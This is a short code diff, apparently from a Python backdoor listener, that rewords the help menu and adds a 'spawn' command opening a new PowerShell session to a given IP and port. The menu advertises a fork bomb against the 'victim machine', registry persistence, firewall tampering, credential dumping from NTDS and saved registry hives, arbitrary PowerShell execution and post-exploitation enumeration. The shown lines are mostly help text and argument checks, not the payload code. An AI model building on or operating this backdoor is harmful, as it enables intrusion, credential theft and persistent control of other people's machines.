@@ -27,9 +27,10 @@ help = """
 * fork -> run a fork bomb in victim machine                                    *
 * persistence -> set persistence using REGKEY (windows only)                   *
 * fw -> add firewall rules:  fw [in/out] [port number] [rule name]             *
-* ntds -> dump creds using ntds  in C:\Windows\Temp\copy-ntds                  *
-* regsave -> dump creds using reg save in C:\Windows\Temp\                     *
+* ntds -> dump credentials using ntds  in C:\Windows\Temp\copy-ntds            *
+* regsave -> dump credentials using reg save in C:\Windows\Temp\               *
 * powershell [cmd] OR [script] -> run the given powershell command or script   *
+* spawn [ip] [port] -> spawn a separate powershell session to the given target *
 * enum -> run post-exploitation enumeration                                    *
 * q -> kill the backdoor                                                       *
 * exit  -> exit the listener                                                   *
@@ -109,6 +110,9 @@ class listener:
                         else:
                             continue
                     pass
+                elif cmd[0] == "spawn" and not cmd[1:]:
+                    print red,"usage: spawn [target ip] [target port] ",r
+                    cmd=""
                 elif cmd[0] == "powershell" and not cmd[1:]:
                     print red,"usage: powershell [cmd] OR [script] ",r
                     cmd = ""
